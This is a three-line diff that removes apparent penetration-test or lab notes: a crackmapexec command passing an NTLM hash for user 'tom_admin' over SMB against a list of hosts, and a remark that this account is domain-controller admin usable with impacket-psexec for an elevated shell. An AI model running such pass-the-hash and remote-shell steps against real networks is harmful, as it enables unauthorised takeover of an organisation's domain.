@@ -1,3 +1,0 @@
-crackmapexec smb ad-scope.txt -u 'tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc
-
-tom_admin is admin in DC and we can use impacket-psexec to get a elevated shell in DC
